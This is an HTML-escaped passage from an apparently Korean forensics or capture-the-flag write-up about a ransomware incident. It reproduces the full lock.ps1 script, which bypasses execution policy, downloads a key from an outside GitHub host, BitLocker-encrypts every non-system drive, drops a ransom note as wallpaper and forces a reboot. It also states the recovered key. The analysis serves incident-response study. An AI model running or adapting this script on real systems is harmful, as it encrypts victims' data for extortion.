&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_UPDATEINIFILE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_SENDCHANGE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x02&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wallpaper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SystemParametersInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPI_SETDESKWALLPAPER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imagePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_UPDATEINIFILE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_SENDCHANGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Restart-Computer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이렇게 lock.ps1를 구할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-암호화-쉘스크립트-분석lockps1&quot;&gt;4. 암호화 쉘스크립트 분석(lock.ps1)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;BitLocker로 암호화했을 때의 CipherSuite를 뜯어보자.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;암호화에 사용된 응용: BitLocker&lt;/li&gt;
  &lt;li&gt;암호화에 사용된 키값: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://raw.githubusercontent.com/imnothackerkkk/key/main/secret&lt;/code&gt;에서 다운로드된 컨텐츠
    &lt;ol&gt;
      &lt;li&gt;앞에서 이미 확인했지만, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Giveme the100BTC!!!&lt;/code&gt; 이다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;암호화 루틴: AES128&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 두번째 문항도 해결했다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;mark&gt;(1) dll인젝션에 사용된 dll 파일명 (.dll 포함): version.dll&lt;/mark&gt;&lt;/p&gt;

  &lt;p&gt;&lt;mark&gt;(2) 비트라커의 평문키: Giveme the100BTC!!!&lt;/mark&gt;&lt;/p&gt;

  &lt;p&gt;(3) 암호화된 파티션 내부 설계도면에 적힌 가격&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;이제 암호화된 파티션 내부 설계도면을 확보해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# lock.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Start-Process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ArgumentList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-NoProfile -ExecutionPolicy Bypass -Command &amp;amp; { &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$scriptBlock&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; }&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WindowStyle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Scope&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LocalMachine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/imnothackerkkk/key/main/secret&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-RestMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volumes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-BitLockerVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$osVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-WmiObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Win32_OperatingSystem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SystemDrive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-String&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volumes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ne&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$osVolume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enable-BitLocker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-EncryptionMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Aes128&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PasswordProtector&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Disable-BitLockerAutoUnlock&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-BitLockerVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/imnothackerkkk/key/main/ransomnote.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/imnothackerkkk/key/main/readme.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetFolderPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Desktop&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ChildPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;note.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ChildPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;readme.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imageFileName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;note.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imagePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ChildPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imageFileName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-Type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TypeDefinition&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;@&quot;
using System;
using System.Runtime.InteropServices;
public class Wallpaper
{
    [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
&quot;@&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPI_SETDESKWALLPAPER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_UPDATEINIFILE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_SENDCHANGE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x02&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wallpaper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SystemParametersInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPI_SETDESKWALLPAPER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imagePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_UPDATEINIFILE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPIF_SENDCHANGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Restart-Computer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 코드를 보면, 시스템 폴더가 위치해 있는 드라이브를 제외하고 이외 드라이브를 암호화하는 모습을 볼 수 있다. 전형적인 랜섬웨어 수법이다.&lt;/p&gt;

&lt;p&gt;따라서 이외 D, E등의 파티션이 암호화됐을 텐데,&lt;/p&gt;

&lt;p&gt;이건 FTK Imager로 해결될 게 아니니 침해당한 시스템상에서 복호화 스크립트를 돌리는 것으로 하자.&lt;/p&gt;

&lt;p&gt;그냥 저 쉘 스크립트 그대로 응용해서 복호화 루틴 짜면 될 듯?&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Start-Process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ArgumentList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-NoProfile -ExecutionPolicy Bypass -Command &amp;amp; { &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$scriptBlock&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; }&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WindowStyle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Scope&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LocalMachine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/imnothackerkkk/key/main/secret&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-RestMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volumes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-BitLockerVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$osVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-WmiObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Win32_OperatingSystem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SystemDrive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-String&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
